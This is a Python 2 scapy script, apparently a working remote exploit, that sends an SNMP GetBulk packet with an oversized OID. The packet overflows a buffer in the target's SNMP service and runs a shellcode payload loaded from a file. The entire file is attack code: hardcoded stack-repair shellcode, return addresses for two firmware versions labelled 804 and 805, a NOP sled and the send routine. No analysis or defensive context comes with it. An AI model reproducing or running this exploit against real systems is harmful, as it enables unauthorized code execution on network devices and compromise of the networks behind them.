# -*- coding:utf-8 -*-
#!/usr/bin/python

from scapy.all import *
from scapy.layers import *
import random
import binascii

def attack(iface, ip, port, ver, commun, shellcodePath):
    print "[*] Interface: " + iface
    print "[*] Target IP: " + ip
    print "[*] Target Port: " + str(port)
    print "[*] Target Ver: " + ver
    print "[*] Community String: " + commun

    ShellCode_ESP_Jump = "\x8B\x7C\x24\x14\x8B\x07\xFF\xE0"

    #version
    ShellCode_nop_padding = "\x90" * 30
    ShellCode_Retn_Addr_804 = "\x6D\xBC\x1A\x09"
    ShellCode_Repair_Stack_Balance_804 = "\xB8\x8C\x64\xA8\x08\x83\xEC\x04\x89\x04\x24\x89\xE5\x83\xC5\x58\x31\xC0\x31\xDB\xB3\x10\x31\xF6\xBF\xAE\xAA\xAA\xAA\x81\xF7\xA5\xA5\xA5\xA5\x60\x8B\x84\x24\xC8\x01\x00\x00\x04\x50\xFF\xD0\x61\xC3"

    ShellCode_Retn_Addr_805 = "\xFD\xCD\xB2\x08"
    ShellCode_Repair_Stack_Balance_805 = "\xB8\xCC\x40\xAB\x08\x83\xEC\x04\x89\x04\x24\x89\xE5\x83\xC5\x58\x31\xC0\x31\xDB\xB3\x10\x31\xF6\xBF\xAE\xAA\xAA\xAA\x81\xF7\xA5\xA5\xA5\xA5\x60\x8B\x84\x24\xC8\x01\x00\x00\x04\x41\xFF\xD0\x61\xC3"

    ############################################################################################
    ShellCode_Retn_Addr = None
    ShellCode_Repair_Stack_Balance = None
    ShellCode_Implant_Payload = None

    if ver == "804":
        ShellCode_Repair_Stack_Balance = ShellCode_Repair_Stack_Balance_804
        ShellCode_Retn_Addr = ShellCode_Retn_Addr_804
    elif ver == "805":
        ShellCode_Repair_Stack_Balance = ShellCode_Repair_Stack_Balance_805
        ShellCode_Retn_Addr = ShellCode_Retn_Addr_805

    shellcodeFile = open(shellcodePath, "r")
    ShellCode_Implant_Payload = shellcodeFile.read()

    head_ovf = '1.3.6.1.4.1.9.9.491.1.3.3.1.1.5.9'
    oidLen_ovf = 82 + len(ShellCode_Retn_Addr) + len(ShellCode_ESP_Jump)
    wapper_1 = []
    wapper_2 = []
    wapper_3 = []
    for byte in ShellCode_Repair_Stack_Balance:
        wapper_1.append(str(ord(byte)))
    for byte in ShellCode_Retn_Addr:
        wapper_2.append(str(ord(byte)))
    for byte in ShellCode_ESP_Jump:
        wapper_3.append(str(ord(byte)))
    oid_ovf = ".".join(wapper_1) + ".19" * (82 - len(ShellCode_Repair_Stack_Balance)) + (
        "." + ".".join(wapper_2) + "." + ".".join(wapper_3))

    head_1 = "1.3.6.1.2.1.1.1"
    oid_1 = ShellCode_nop_padding + ShellCode_Implant_Payload

    overflow = head_ovf + "." + str(oidLen_ovf) + "." + oid_ovf

    print ""
    print "[*] Head length : %d" % len(head_ovf.split('.'))
    print "[*] OID length : %d" % len(oid_ovf.split('.'))
    print "[*] Overflow length : %d" % len(overflow.split('.'))

    print "[*] OID: " + oid_ovf

    try:
        snmpBulk = SNMPbulk(id=random.randint(0x80000, 0x1fffffff), max_repetitions=1,
                            varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.2.1.1.1"), value=ASN1_STRING(oid_1)),
                                         SNMPvarbind(oid=ASN1_OID(overflow))])
        snmp = SNMP(PDU=snmpBulk, community=commun)

        packet = IP(dst=ip) / UDP(dport=port, sport=12345) / snmp
        send(packet)
        # packet.show()
    except Exception, e:
        print e